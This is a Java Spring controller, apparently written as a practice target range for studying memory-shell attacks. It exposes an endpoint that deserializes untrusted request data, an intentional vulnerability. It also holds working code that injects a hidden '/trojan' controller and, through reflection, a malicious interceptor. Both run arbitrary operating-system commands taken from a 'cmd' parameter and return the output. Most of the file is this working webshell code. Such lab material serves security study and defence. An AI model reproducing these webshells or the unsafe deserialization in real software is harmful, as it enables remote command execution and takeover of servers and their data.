package com.endlessshw.springapi.controller;

import com.endlessshw.springapi.MainConfiguration;
import com.endlessshw.springapi.bean.User;
import com.endlessshw.springapi.util.SerUtil;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.List;

/**
 * @author hasee
 * @version 1.0
 * @description: 靶场
 * @date 2025/1/18 22:30
 */
@Controller
public class TargetController {
    @ResponseBody
    @GetMapping("/target")
    public String index(@RequestParam("data") String data){
        User user = (User)SerUtil.unSerialize(data);
        if (!user.getUsername().isEmpty()) {
            System.out.println(user);
            return "Hello " + user.getUsername();
        } else {
            return "Sorry, Something Wrong!";
        }
    }

    @ResponseBody
    @GetMapping("/inject")
    public String inject(){
        // 1. 恶意 Controller 实例化
        EvilController evilController = new EvilController();

        // 2. 创建 RequestMappingInfo 以完成路由映射
        RequestMappingInfo.Builder builder = RequestMappingInfo.paths("/trojan").methods(RequestMethod.GET);
        RequestMappingInfo requestMappingInfo = builder.options(new RequestMappingInfo.BuilderConfiguration()).build();

        // 3. 完成注册
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        if (context == null) {
            return "inject fail!";
        }
        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Method cmdMethod = evilController.getClass().getMethods()[0];
        // 这里注册 controller，前置是需要获取到
        requestMappingHandlerMapping.registerMapping(requestMappingInfo, evilController, cmdMethod);
        return "inject done!";
    }

    /**
     * 模拟靶场，访问即会触发
     *
     * @return
     * @throws Exception
     */
    @ResponseBody
    @GetMapping("/interceptor")
    public String interceptor() throws Exception {
        // 1. 拿到 HandlerMapping
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        if (context == null) {
            return "inject fail!";
        }
        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射修改其内部变量 adaptedInterceptors
        // 这里注意，要使用父类 AbstractHandlerMapping 的 class
        Field adaptedInterceptorsField = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        adaptedInterceptorsField.setAccessible(true);
        List<HandlerInterceptor> handlerInterceptors = (List<HandlerInterceptor>) adaptedInterceptorsField.get(requestMappingHandlerMapping);
        handlerInterceptors.add(new EvilInterceptor());
        adaptedInterceptorsField.set(requestMappingHandlerMapping, handlerInterceptors);

        return "interceptor done!";
    }



    /**
     * 恶意 Controller
     */
    @Controller
    public class EvilController{
        @ResponseBody
        public String cmd(@RequestParam("cmd") String cmd) throws Exception {
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "GB2312"));
            String line;
            StringBuilder result = new StringBuilder();
            while ((line = bufferedReader.readLine()) != null) {
                result.append(line).append("\n");
            }
            bufferedReader.close();
            inputStream.close();
            System.out.println(result);
            return result.toString().replaceAll("\n", "<\\br>");
        }
    }


    /**
     * 恶意的 Interceptor
     */
    public class EvilInterceptor implements HandlerInterceptor {
        @Override
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
            InputStream inputStream = Runtime.getRuntime().exec(request.getParameter("cmd").trim()).getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "GB2312"));
            String line;
            StringBuilder result = new StringBuilder();
            while ((line = bufferedReader.readLine()) != null) {
                result.append(line).append("\n");
            }
            bufferedReader.close();
            inputStream.close();
            System.out.println(result);
            response.setCharacterEncoding("GB2312");
            response.getWriter().write(result.toString().replaceAll("\n", "<\\br>"));
            response.getWriter().flush();
            response.getWriter().close();
            HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
        }
    }

}
